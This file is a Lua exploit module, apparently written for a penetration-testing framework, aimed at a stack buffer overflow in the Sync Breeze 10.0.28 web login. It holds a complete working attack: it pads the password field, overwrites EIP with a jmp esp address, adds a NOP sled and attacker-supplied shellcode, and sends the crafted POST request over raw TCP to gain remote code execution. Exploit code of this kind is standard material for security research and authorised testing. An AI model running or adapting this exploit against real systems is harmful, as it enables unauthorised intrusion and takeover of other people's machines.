local tcp = require("tcp")
local http = require("http")
local time = require("time")

-- Metadata
METADATA = {
	AUTHOR = { "farinap5 <farinap5@protonmail.com>" },
	VERSION = "1.0",
	TAGS = { "http", "bof", "rce" },
	INFO = [[Sync Breeze buffer 10.0.28 overflow rce attempt
Badchars: 0x00 0x0a 0x0d 0x25 0x26 0x2b0 0x3d]],
}

-- Arguments/Variables needed to execute script
VARS = {
	RHOST = { VALUE = "0.0.0.0", NEEDED = "yes", DESCRIPT = "Remote Host" },
	RPORT = { VALUE = "80", NEEDED = "no", DESCRIPT = "Remote Port" },
	SHELLCODE = { VALUE = "/tmp/shell.bin", NEEDED = "yes", DESCRIPT = "Shellcode file" },
}

function Init()
	Meta(METADATA) -- Load metadata
	LoadVars(VARS) -- Load variables
end

function GetShellcode()
	local file, err = io.open(VARS.SHELLCODE.VALUE, "rb")
	if err then
		return nil, err
	end

	local data = file:read("*a")
	file:close()

	return data, nil
end

function Test(host)
	local client = http.client()
	local url = "http://" .. host .. "/"
	PrintInfoln("calling " .. url)
	local request = http.request("GET", url)
	local result, err = client:do_request(request)
	return err
end

function Main()
	local host = VARS.RHOST.VALUE .. ":" .. VARS.RPORT.VALUE
	local httpErr = Test(host)
	if httpErr then
		PrintErrln(httpErr)
		return
	end
	PrintSuccsln("host is up")

	local data, err = GetShellcode()
	if err then
		PrintErrln(err)
		return
	end

	PrintInfoln("data len: " .. #data)

	local fill = string.rep("A", 520)
	--Address=10090C83 Disassembly=jmp esp
	local eip = "%83%0C%09%10" -- jmp 0x10090c83
	local aux = string.rep("%90", 20)
	local ext = string.rep("%90", 1400 - 520 - 4 - 20 - #data)
	--local buff = string.rep("C", 16)
	local payload = "username=AAAAA&password=" .. fill .. eip .. aux .. data .. ext

	local http_payload = "POST /login HTTP/1.1\r\n"
	http_payload = http_payload .. "Host: " .. host .. "\r\n"
	http_payload = http_payload .. "Accept-Language: en-US,en;q=0.5\r\n"
	http_payload = http_payload .. "Accept-Encoding: gzip, deflate\r\n"
	http_payload = http_payload .. "Referer: http://" .. host .. "/login\r\n"
	http_payload = http_payload .. "Content-Type: application/x-www-form-urlencoded\r\n"
	http_payload = http_payload .. "Content-Length: " .. string.len(payload) .. "\r\n"
	http_payload = http_payload .. "Connection: keep-alive\r\n"
	http_payload = http_payload .. "Upgrade-Insecure-Requests: 1\r\n"
	http_payload = http_payload .. "\r\n"
	http_payload = http_payload .. payload

	PrintInfoln("sending payload")
	local conn, err = tcp.open(host)
	if err then
		PrintErrln(err)
		return
	end

	err = conn:write(http_payload)
	if err then
		PrintErrln(err)
		return
	end

	--[[local result, err = conn:read()
	if err then
		PrintErrlnErrln(err)
		return
	end]]
	--

	time.sleep(3)
	local httpErr1 = Test(host)
	if httpErr1 then
		PrintSuccsln("host looks down. Good?")
		return
	end
	PrintErrln("host is up")
end
